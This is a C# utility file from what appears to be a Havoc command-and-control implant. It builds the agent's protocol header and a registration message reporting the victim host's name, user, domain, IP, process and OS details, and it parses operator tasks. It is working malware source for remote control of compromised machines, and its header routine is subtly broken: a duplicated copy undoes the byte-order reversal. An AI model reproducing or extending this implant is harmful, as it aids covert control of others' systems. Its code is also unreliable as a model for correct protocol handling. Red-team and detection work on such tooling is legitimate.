using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Web.Script.Serialization;
namespace HavocImplant.Communications
{
    internal class Utils
    {
        static Implant agent;
        public static void Init(Implant implant)
        {
            agent = implant;
        }
        public static byte[] createHeader(byte[] magic, string requestBody)
        {
            int size = requestBody.Length + 12;
            byte[] size_bytes = new byte[4] { 0x00, 0x00, 0x00, 0x00 };
            if (BitConverter.IsLittleEndian)
            {
                Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
                Array.Reverse(size_bytes);
            }
            Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
            byte[] agentHeader = new byte[size_bytes.Length + magic.Length + agent.agentId.Length];
            Array.Copy(size_bytes, 0, agentHeader, 0, size_bytes.Length);
            Array.Copy(magic, 0, agentHeader, size_bytes.Length, magic.Length);
            Array.Copy(agent.agentId, 0, agentHeader, size_bytes.Length + magic.Length, agent.agentId.Length);
            return agentHeader;
        }
        public static string obtainRegisterDict(int id)
        {
            Dictionary<string, string> registrationAttrs = new Dictionary<string, string>()
            {
                { "AgentID", id.ToString() },
                { "Hostname", agent.hostname },
                { "Username", agent.userName },
                { "Domain", agent.domainName },
                { "InternalIP", agent.IP },
                { "Process Path", "process path here" },
                { "Process ID", agent.PID },
                { "Process Parent ID", agent.PPID },
                { "Process Arch", "x64" },
                { "Process Elevated", "elevated status here" },
                { "OS Build", agent.osBuild },
                { "OS Arch", agent.osArch },
                { "Sleep", (agent.sleepTime / 1000).ToString() },
                { "Process Name", agent.processName },
                { "OS Version", agent.osVersion }
            };
            string strRegistrationAttrsAsJSON = DictionaryToJson(registrationAttrs);
            string strPostReq = "{\"task\": \"register\", \"data\": \"{0}\"}".Replace("{0}", strRegistrationAttrsAsJSON);
            return strPostReq;
        }
        /* Example output  (includes opening and closing braces)
         * {\"AgentID\": \"7933\",\"Hostname\": \"WIN-89GEKIM6NAB\",\"Username\": \"Administrator\",\"Domain\": \"\",\"InternalIP\": \"192.168.1.122\",
         * \"Process Path\": \"process path here\",\"Process ID\": \"4828\",\"Process Parent ID\": \"ppid here\",\"Process Arch\": \"x64\",
         * \"Process Elevated\": \"elevated status here\",\"OS Build\": \"14393\",\"OS Arch\": \"\",\"Sleep\": \"5\",\"Process Name\": \"SharpAgent\",
         * \"OS Version\": \"Windows Server 2016 Datacenter\"}
         */
        public static string DictionaryToJson(Dictionary<string, string> dict)
        {
            var entries = dict.Select(d => string.Format("\\\"{0}\\\": \\\"{1}\\\"", d.Key, string.Join(",", d.Value)));
            return "{" + string.Join(",", entries) + "}";
        }

        // Parse the task list and extract the task at the offset.
        public static Implant.task ParseTask(byte[] Tasks, int size, int offset) 
        {
            string strTask = Encoding.UTF8.GetString(Tasks, offset + 4, size);
            Console.WriteLine($"Parsed json is: {strTask}");
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            serializer.MaxJsonLength = int.MaxValue; //bro they really cappin us out here NO CAPPA.
            return serializer.Deserialize<Implant.task>(strTask);
        }

        /*
         * Intended to clean up strings returned from output that may look like:
         * {
         *      "commandoutput":"bruh\n "what""
         * }
         */
        public static string CleanString(string str)
        {
            return str.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }
    }
}
